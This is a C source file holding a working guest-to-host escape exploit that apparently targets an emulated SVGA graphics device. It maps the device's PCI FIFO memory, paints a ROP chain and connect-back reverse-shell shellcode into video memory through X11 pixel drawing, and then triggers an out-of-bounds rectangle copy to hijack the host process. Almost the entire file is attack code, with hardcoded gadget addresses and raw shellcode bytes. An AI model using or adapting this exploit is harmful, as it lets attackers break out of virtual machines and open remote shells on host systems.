#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <X11/Xlib.h>

// gadget that we will use, ASLR being disabled, libc & proc mapping addresses are fixed
#define PROG_BASE 0x0000555555554000
#define LIBC_BASE 0x00007ffff7844000
#define add_rsp (LIBC_BASE+0x0000000000043857) // add rsp, 0xa8 ; ret
#define add_rsp2 (LIBC_BASE+0x000000000008b3b0) // add rsp, 0xb0 ; pop rbx ; ret
#define gsyscall (LIBC_BASE+0x00000000000942b6)  // syscall; ret;
#define pop_rax PROG_BASE+0x00000000006d488f  // pop rax ; ret
#define pop_rdi PROG_BASE+0x000000000066e72d  // pop rdi ; ret
#define pop_rsi PROG_BASE+0x000000000052c044  // pop rsi ; ret
#define pop_rdx PROG_BASE+0x000000000038f0aa  // pop rdx ; ret

// connect back reverse shellcode
unsigned char shellc[] = {0x48, 0x83, 0xec, 0x70, 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x2, 0x5f, 0x6a, 0x1, 0x5e, 0xf, 0x5, 0x97, 0xb0, 0x2a, 0x48, 0xb9, 0xfe, 0xff, 0xcf, 0x35, 0xfa, 0x0, 0x93, 0x3f, 0x48, 0xf7, 0xd9, 0x51, 0x54, 0x5e, 0xb2, 0x10, 0xf, 0x5, 0x6a, 0x3, 0x5e, 0xb0, 0x21, 0xff, 0xce, 0xf, 0x5, 0x75, 0xf8, 0x99, 0x52, 0x48, 0xb9, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x51, 0x54, 0x5f, 0xb0, 0x3b, 0xf, 0x5,0x90,0x90,0x90};

// rop do mprotect(0x7fff66c00000,0x1000,7) to make screen memory RWX then increase rsp and jump to shellcode
uint64_t rop[] = { pop_rax, 10, pop_rdi, 0x7fff66c00000, pop_rsi, 0x1000, pop_rdx, 7, gsyscall, add_rsp2, 0x00007fff66c00068, 0x00007fff66c00068, 0x00007fff66c00068 };

unsigned int fifo_min, fifo_max, fifo_next, fifo_stop;

#define SVGA_CMD_UPDATE 1
#define SVGA_CMD_RECT_COPY 3

char filename[] = "/sys/devices/pci0000\:00/0000\:00\:03.0/resource2";
void *map_base;

unsigned int read_val(int index) {
	return *(unsigned int *)(map_base+index);
}

unsigned int write_val(unsigned int index, int val) {
        *(int *)(map_base+index) = val;
}

void copyrect(int x, int y, int dx, int dy, int width, int height)
{
unsigned int pos;

	pos = fifo_stop;
	write_val(pos, SVGA_CMD_RECT_COPY);   pos+=4;
	write_val(pos, x);   pos+=4;
	write_val(pos, y);   pos+=4;
	write_val(pos, dx);   pos+=4;
	write_val(pos, dy);   pos+=4;
	write_val(pos, width);   pos+=4;
	write_val(pos, height);   pos+=4;
	fifo_next = pos;
	write_val(8, pos);
}

int main() {
void *virt_addr;
off_t target, target_base;
int map_size = 0x10000;
int fd;
unsigned long long *src;
int i;

	if((fd = open(filename, O_RDWR | O_SYNC)) == -1)
	{
		printf("Error opening device\n");
		exit(-1);
	}
	target = 0;
	target_base = target & ~(sysconf(_SC_PAGE_SIZE)-1);
	map_base = mmap(0, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target_base);
	if(map_base == (void *) -1)
	{
		printf("Error mapping device\n");
		exit(-1);
	}

	printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);
	fflush(stdout);
	
	Display *display = XOpenDisplay(NULL);
    if (!display) {
        fprintf(stderr, "Unable to open X display\n");
        return 1;
    }
    // get actual values of FIFO registers from mapped memory
	fifo_min = read_val(0);
	fifo_max = read_val(4);
	fifo_next = read_val(8);
	fifo_stop = read_val(12);
	printf("fifo_min = 0x%x\n", fifo_min);
	printf("fifo_max = 0x%x\n", fifo_max);
	printf("fifo_next = 0x%x\n", fifo_next);
	printf("fifo_stop = 0x%x\n", fifo_stop);
	
    int screen = DefaultScreen(display);
    Window root = RootWindow(display, screen);

    // Get the width and height of the screen
    int width = DisplayWidth(display, screen);
    int height = DisplayHeight(display, screen);

    // Create a borderless window
    Window window = XCreateSimpleWindow(display, root, 0, 0, width, height, 0, 0, BlackPixel(display, screen));

    // Set window attributes for a borderless window
    XSetWindowAttributes swa;
    swa.override_redirect = True;
    XChangeWindowAttributes(display, window, CWOverrideRedirect, &swa);

    // Map the window
    XMapWindow(display, window);
    XFlush(display);

    // Create a graphics context
    GC gc = XCreateGC(display, window, 0, NULL);

    // COPY ROP in vram screen memory
    for (i=0; i<sizeof(rop); i+=4)
    {
	XSetForeground(display, gc, *(unsigned int *)((void *)&rop[0]+i) ); // Red color
    	XDrawPoint(display, window, gc, (i>>2), 0);
    	XFlush(display);
	}

    // copy shellcode after ROP
     for (i=0; i<sizeof(shellc); i+=4)
    {
        XSetForeground(display, gc, *(unsigned int *)((void *)&shellc[0]+i) ); // Red color
        XDrawPoint(display, window, gc, 26+(i>>2), 0);
        XFlush(display);
        }

    // take a nap
    sleep(2);
    copyrect(0,0,width-42,-1,(sizeof(rop)/4),1);

    // Wait for a key press
    XEvent event;
    XNextEvent(display, &event);

    // Clean up
    XFreeGC(display, gc);
    XDestroyWindow(display, window);
    XCloseDisplay(display);

    return 0;
}

